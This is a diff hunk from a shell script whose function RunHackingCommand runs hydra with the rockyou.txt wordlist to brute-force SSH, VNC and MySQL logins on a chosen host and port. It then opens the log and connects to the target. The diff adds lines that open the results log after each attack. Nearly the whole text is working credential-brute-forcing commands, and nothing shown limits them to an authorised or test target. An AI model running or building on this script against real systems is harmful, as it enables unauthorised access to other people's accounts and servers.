@@ -87,16 +87,19 @@ RunHackingCommand() {
     case "$port" in
     22)
         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I ssh://"$host":"$port"
+        xdg-open output.log
         xmessage -center "Connecting to ${user}@${host}:${port}"
         ssh "${user}@${host}" -p "${port}"
         ;;
     5900)
         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://"$host":"$port"
+        xdg-open output.log
         xmessage -center "Connecting to ${host}:${port} via VNC."
         xdg-open "vnc://${host}"
         ;;
     3306)
         hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://"${host}":"${port}"
+        xdg-open output.log
         xmessage -center "Connecting to MySQL at ${host}:${port}"
         mysql -u "${user}" -p
         ;;
